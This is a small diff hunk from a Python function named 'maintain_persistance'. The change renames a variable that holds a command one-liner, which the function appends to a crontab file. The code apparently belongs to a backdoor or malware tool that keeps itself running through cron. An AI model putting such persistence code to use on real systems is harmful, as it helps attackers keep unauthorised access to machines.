@@ -47,7 +47,7 @@ def maintain_persistance():
 
     if cron_set == False:
         with open(crontab, "a") as file:
-            file.write(oneliner)
+            file.write(one_liner)
             file.close()
 
     
